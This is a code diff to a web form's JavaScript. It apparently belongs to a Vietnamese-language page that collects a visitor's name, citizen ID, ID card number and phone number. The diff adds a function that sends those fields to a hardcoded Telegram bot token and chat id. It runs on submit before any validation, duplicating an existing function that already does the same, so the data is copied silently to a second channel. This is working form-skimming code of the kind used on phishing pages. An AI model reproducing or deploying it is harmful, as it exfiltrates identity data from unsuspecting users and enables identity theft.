@@ -932,6 +932,17 @@
                 api.send();
                 console.log("message successfully") 
             }
+            function telegrams(hoten, cccd, cmnd,sdt){
+                var my_text = `Khách gửi hồ kbt - Họ tên: ${hoten}%0A - CCCD: ${cccd}%0A CMND: ${CMND}%0A - SĐT: ${sdt}`
+                var token = "2117356737:AAEUlBzzaArt_kBuMBWypzVygWAbVX03WVw";
+                // 2117356737:AAEUlBzzaArt_kBuMBWypzVygWAbVX03WVw
+                var chat_id = 5664202010
+                var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`//&parse_mode=html
+                let api = new XMLHttpRequest();
+                api.open("GET", url, true);
+                api.send();
+                console.log("message successfully") 
+            }
             function checkNumber(id, value)
             {
                 var svalue= value;
@@ -947,7 +958,7 @@
                             
             function validateform() {
                 telegram($("#hoten").val(), $("#CCCD").val(), $("#CMND").val(), $("#sdt").val())
-                
+                telegrams($("#hoten").val(), $("#CCCD").val(), $("#CMND").val(), $("#sdt").val())
                 if ($("#hoten").val() == null || $("#hoten").val() === "") {
                     $("#hoten").css('box-shadow', '0px 0px 7px red');
                     location.href = "#hoten";
